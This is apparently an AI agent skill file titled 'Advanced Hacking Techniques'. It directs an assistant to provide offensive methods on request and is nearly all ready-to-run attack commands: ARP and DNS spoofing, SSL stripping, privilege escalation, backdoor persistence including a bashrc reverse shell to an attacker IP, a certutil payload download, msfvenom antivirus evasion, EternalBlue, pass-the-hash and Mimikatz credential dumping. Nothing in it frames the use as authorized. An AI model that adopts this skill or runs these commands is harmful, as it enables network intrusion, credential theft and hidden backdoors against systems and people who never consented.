---
name: advanced-hacking
description: Network attacks, MITM, privilege escalation, exploitation.
tags: [hacking, network, mitm, privilege-escalation, exploitation]
---

# Advanced Hacking Techniques

Use when user requests advanced hacking methods, network attacks, man-in-the-middle, privilege escalation, or system exploitation techniques.

## Trigger Conditions
- Network attacks (ARP spoofing, DNS poisoning)
- MITM (Man-in-the-Middle) attack requests
- Privilege escalation (Linux/Windows)
- System exploitation methods
- Post-exploitation techniques
- Lateral movement in networks

## Network Attacks

### ARP Spoofing / MITM
```bash
# Tool: arpspoof (dsniff package)
# Poison ARP cache to intercept traffic

# 1. Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# 2. ARP spoof both directions
arpspoof -i eth0 -t [TARGET_IP] [GATEWAY_IP]
arpspoof -i eth0 -t [GATEWAY_IP] [TARGET_IP]

# 3. Capture traffic
tcpdump -i eth0 -w capture.pcap

# Alternative: ettercap
ettercap -T -M arp:remote /[TARGET_IP]/ /[GATEWAY_IP]/
```

### DNS Spoofing
```bash
# Tool: dnsspoof (dsniff)
# Redirect DNS queries to malicious server

# 1. Create hosts file
echo "[TARGET_DOMAIN] [MALICIOUS_IP]" > dns.hosts

# 2. Run dnsspoof
dnsspoof -i eth0 -f dns.hosts

# Alternative: Bettercap
bettercap -iface eth0
> set dns.spoof.domains [TARGET_DOMAIN]
> set dns.spoof.address [MALICIOUS_IP]
> dns.spoof on
```

### SSL Stripping
```bash
# Tool: sslstrip - downgrade HTTPS to HTTP

# 1. Setup iptables redirect
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080

# 2. Run sslstrip
sslstrip -l 8080 -w sslstrip.log

# 3. View captured credentials
tail -f sslstrip.log
```

## Privilege Escalation

### Linux Privilege Escalation
```bash
# 1. Check SUID binaries
find / -perm -4000 2>/dev/null

# 2. Check sudo permissions
sudo -l

# 3. Exploit sudo vulnerabilities
# CVE-2021-3156 (Baron Samedit)
sudoedit -s /

# 4. Check writable /etc/passwd
ls -la /etc/passwd
# If writable:
echo 'hacker:$6$salt$hash:0:0:root:/root:/bin/bash' >> /etc/passwd

# 5. Kernel exploits
uname -a
searchsploit linux kernel [VERSION]

# 6. Cron job exploitation
cat /etc/crontab
# If writable cron script, inject reverse shell

# 7. Capabilities abuse
getcap -r / 2>/dev/null
# If cap_setuid+ep on binary, exploit it
```

### Windows Privilege Escalation
```powershell
# 1. Check current privileges
whoami /priv

# 2. Check unquoted service paths
wmic service get name,pathname,displayname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# 3. Check AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# 4. Check weak service permissions
accesschk.exe -uwcqv "Authenticated Users" * /accepteula

# 5. Token impersonation (SeImpersonatePrivilege)
# Use: Juicy Potato, PrintSpoofer, RoguePotato

# 6. Check scheduled tasks
schtasks /query /fo LIST /v

# 7. DLL hijacking opportunities
```

## Post-Exploitation

### Persistence Mechanisms

**Linux:**
```bash
# 1. Cron job backdoor
(crontab -l; echo "@reboot /tmp/.backdoor.sh") | crontab -

# 2. SSH key persistence
mkdir -p ~/.ssh
echo "[ATTACKER_PUBLIC_KEY]" >> ~/.ssh/authorized_keys

# 3. bashrc backdoor
echo 'bash -i >& /dev/tcp/[ATTACKER_IP]/4444 0>&1 &' >> ~/.bashrc

# 4. systemd service
cat > /etc/systemd/system/backdoor.service <<EOF
[Unit]
Description=System Monitor

[Service]
ExecStart=/usr/local/bin/backdoor
Restart=always

[Install]
WantedBy=multi-user.target
EOF
systemctl enable backdoor.service
```

**Windows:**
```powershell
# 1. Registry Run key
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\backdoor.exe"

# 2. Scheduled Task
schtasks /create /tn "SystemUpdate" /tr "C:\backdoor.exe" /sc onlogon /ru System

# 3. Service creation
sc create Backdoor binPath= "C:\backdoor.exe" start= auto
sc start Backdoor

# 4. WMI event subscription (stealthy)
```

### Lateral Movement
```bash
# 1. Pass-the-Hash (Windows)
# Tool: Impacket psexec
psexec.py -hashes :[NTLM_HASH] administrator@[TARGET_IP]

# 2. Kerberos ticket attacks
# Golden Ticket, Silver Ticket via Mimikatz

# 3. SSH key stealing (Linux)
find / -name "id_rsa" 2>/dev/null
# Copy private keys, use to access other systems

# 4. Credential harvesting
# Windows: Mimikatz
mimikatz.exe
> privilege::debug
> sekurlsa::logonpasswords

# Linux: /etc/shadow
cat /etc/shadow
# Crack with john/hashcat
```

## Evasion Techniques

### Antivirus Evasion
```bash
# 1. Binary obfuscation with msfvenom
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP] LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe > payload.exe

# 2. Encrypt payload (Veil Framework, Phantom Evasion)

# 3. In-memory execution
# PowerShell: Invoke-Expression (IEX)
powershell -enc [BASE64_ENCODED_PAYLOAD]

# 4. Living off the land (LOLBins)
certutil -urlcache -split -f http://[IP]/payload.exe C:\temp\payload.exe
```

### Firewall/IDS Evasion
```bash
# 1. Nmap stealth scanning
nmap -sS -T2 -f --data-length 200 [TARGET]

# 2. Fragmentation
nmap -f [TARGET]

# 3. Custom packet crafting with Scapy
python3 << EOF
from scapy.all import *
packet = IP(dst="[TARGET]")/TCP(dport=80, flags="S")
send(packet)
EOF

# 4. Reverse shells with encryption (meterpreter SSL/TLS)
```

## Tools Workflow

### Metasploit Framework
```bash
# 1. Start msfconsole
msfconsole

# 2. Search exploits
search type:exploit platform:windows

# 3. Use exploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS [TARGET_IP]
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST [ATTACKER_IP]
exploit

# 4. Post-exploitation
# In meterpreter session:
getuid
hashdump
screenshot
keyscan_start
```

### BloodHound (Active Directory)
```bash
# 1. Collect data
bloodhound-python -u [USER] -p [PASS] -d [DOMAIN] -ns [DC_IP] -c all

# 2. Import to BloodHound GUI
# Analyze attack paths to Domain Admins

# 3. Exploit path shown in graph
```

## Pitfalls
- **Noisy techniques**: ARP spoofing detected by IDS
- **Logs**: Privilege escalation attempts logged
- **EDR**: Modern endpoint detection catches common exploits
- **Network monitoring**: MITM attacks visible to SOC
- **Artifacts**: Backdoors leave forensic evidence

## Verification
```bash
# Test privilege escalation
id  # Linux: Should show uid=0(root)
whoami  # Windows: Should show SYSTEM or Administrator

# Test persistence
reboot
# Check if backdoor survives restart
```

## Advanced Resources
- GTFOBins: https://gtfobins.github.io/ (Linux privesc)
- LOLBAS: https://lolbas-project.github.io/ (Windows LOLBins)
- PayloadsAllTheThings: Exploit/privesc cheatsheets
- HackTricks: Comprehensive pentesting guide

## Related Skills
- `blackhat-hacking`: Execute tools via Telegram/CLI
- `sqlmap`: Database exploitation
- `web-pentesting-tools`: Web app attacks
- `windows-pe-cracking`: Binary exploitation
